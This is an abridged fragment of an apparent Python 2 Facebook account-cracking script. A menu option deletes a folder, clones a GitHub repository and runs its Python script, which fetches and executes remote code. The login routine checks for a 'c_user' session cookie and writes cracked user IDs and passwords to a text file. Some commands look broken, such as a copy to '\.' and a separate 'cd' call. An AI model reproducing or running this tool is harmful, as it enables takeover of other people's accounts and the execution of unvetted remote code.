...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In jasmine Paid Commands '
        print '\x1b[1;91m        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('rm -rf PAID')
        os.system('git clone https://github.com/Jasminesuaila/jasminesuarila.git')
        os.system('cp -f PAID/PAID \\.')
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 jasminesuarila.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[IjkCP] ' + uid + ' | ' + pass1
                cp = open('IMTIAZ-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
